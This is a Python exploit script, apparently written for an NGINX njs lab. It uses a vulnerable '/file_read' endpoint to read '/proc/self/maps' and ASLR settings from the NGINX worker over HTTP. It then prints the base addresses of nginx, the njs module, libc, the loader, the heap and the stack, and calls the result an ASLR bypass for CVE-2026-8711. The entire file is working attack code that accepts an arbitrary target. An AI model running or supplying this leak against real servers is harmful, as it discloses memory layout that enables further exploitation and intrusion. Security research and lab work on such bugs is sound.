#!/usr/bin/env python3
"""HTTP-only ASLR map leak composition for the njs js_fetch_proxy lab."""

from __future__ import annotations

import argparse
import http.client
import re
import urllib.parse


MAP_RE = re.compile(r"^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+\S+\s+\S+\s+\S+\s*(.*)$")


def parse_target(value: str, fallback_port: int) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        return parsed.hostname or "127.0.0.1", parsed.port or fallback_port
    if ":" in value.rsplit("@", 1)[-1]:
        host, port = value.rsplit(":", 1)
        return host, int(port)
    return value, fallback_port


def request(host: str, port: int, path: str, timeout: float = 4.0) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path)
        resp = conn.getresponse()
        body = resp.read()
        return resp.status, body
    finally:
        conn.close()


def read_file(host: str, port: int, path: str) -> str:
    query = urllib.parse.urlencode({"path": path})
    status, body = request(host, port, f"/file_read?{query}")
    if status != 200:
        raise RuntimeError(f"file read failed: HTTP {status}: {body[:160]!r}")
    return body.decode("utf-8", "replace")


def first_mapping(maps: str, needle: str | None = None, bracket: str | None = None) -> tuple[int, str] | None:
    for line in maps.splitlines():
        parsed = MAP_RE.match(line)
        if parsed is None:
            continue

        start = int(parsed.group(1), 16)
        perms = parsed.group(3)
        path = parsed.group(4)

        if "r" not in perms:
            continue
        if bracket is not None and bracket in path:
            return start, line
        if needle is not None and needle in path:
            return start, line

    return None


def first_anon_rw_mapping(maps: str) -> tuple[int, str] | None:
    for line in maps.splitlines():
        parsed = MAP_RE.match(line)
        if parsed is None:
            continue

        start = int(parsed.group(1), 16)
        perms = parsed.group(3)
        path = parsed.group(4).strip()

        if path == "" and perms.startswith("rw"):
            return start, line

    return None


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Leak the current NGINX worker /proc/self/maps through a lab njs file-read bug."
    )
    parser.add_argument("--target", default="127.0.0.1:19431", help="HOST:PORT")
    parser.add_argument("--port", type=int, default=19431)
    parser.add_argument("--show-maps", action="store_true")
    args = parser.parse_args()

    host, port = parse_target(args.target, args.port)
    print("CVE-2026-8711 ASLR bypass composition")
    print(f"target    {host}:{port}")
    print("primitive vulnerable njs file-read endpoint")
    print("read      /proc/self/maps from the NGINX worker handling this request")
    print()

    aslr = read_file(host, port, "/proc/sys/kernel/randomize_va_space").strip()
    print(f"kernel ASLR randomize_va_space={aslr}")

    maps = read_file(host, port, "/proc/self/maps")

    targets = [
        ("nginx", first_mapping(maps, needle="/nginx-src/objs/nginx")),
        ("njs module", first_mapping(maps, needle="ngx_http_js_module.so")),
        ("libc", first_mapping(maps, needle="libc.so")),
        ("ld", first_mapping(maps, needle="ld-linux")),
        ("heap", first_mapping(maps, bracket="[heap]")),
        ("anon rw", first_anon_rw_mapping(maps)),
        ("stack", first_mapping(maps, bracket="[stack]")),
    ]

    for name, mapping in targets:
        if mapping is None:
            print(f"{name:<10} not found")
            continue
        base, line = mapping
        print(f"{name:<10} 0x{base:016x}  {line}")

    print()
    print("note      these bases come from the live worker via HTTP, not docker exec/procfs on the host")

    if args.show_maps:
        print()
        print(maps, end="")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
